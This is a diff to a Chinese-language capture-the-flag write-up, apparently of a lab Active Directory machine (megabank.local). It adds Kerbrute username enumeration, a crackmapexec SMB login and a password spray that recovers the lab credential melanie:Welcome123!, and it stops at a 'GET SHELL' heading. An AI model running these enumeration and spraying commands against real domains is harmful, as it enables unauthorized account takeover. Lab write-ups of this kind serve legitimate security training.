@@ -63,27 +63,39 @@ enum4linux 10.129.176.63
 
 <figure><img src="../../.gitbook/assets/10.png" alt=""><figcaption></figcaption></figure>
 
+* 用Kerbrute先过一遍这个username列表，看看哪些用户名是域内有效的。29个用户名25个有效，太多了，看起来不太对，应该不是这么用的：
 
+```bash
+./kerbrute_linux_amd64 username --dc 10.129.176.63 -d megabank.local username.txt
+```
 
+<figure><img src="../../.gitbook/assets/12 (7).png" alt=""><figcaption></figcaption></figure>
 
+<figure><img src="../../.gitbook/assets/13 (7).png" alt=""><figcaption></figcaption></figure>
 
+* 使用crackmapexec和刚才收集到的有效凭证登录一下目标系统的SMB服务：
 
+```bash
+crackmapexec smb 10.129.96.155 -u marko -p 'Welcome123!'
+```
 
+<figure><img src="../../.gitbook/assets/14 (6).png" alt=""><figcaption></figcaption></figure>
 
+* 几次尝试确认自己没有输错后，发现该账户确实登录不上去，决定密码喷洒来找出是否还有其他用户账号也是用的这个密码：
 
+```bash
+crackmapexec smb 10.129.96.155 -u username.txt -p 'Welcome123!'
+```
 
+<figure><img src="../../.gitbook/assets/15 (7).png" alt=""><figcaption></figcaption></figure>
 
+<figure><img src="../../.gitbook/assets/16 (5).png" alt=""><figcaption></figcaption></figure>
 
-
-
-
-
-
-
+* 找到了一个新的有效凭证：<mark style="color:red;">**melanie:Welcome123!**</mark>
 
 ### GET SHELL
 
-
+* 使用
 
 
 
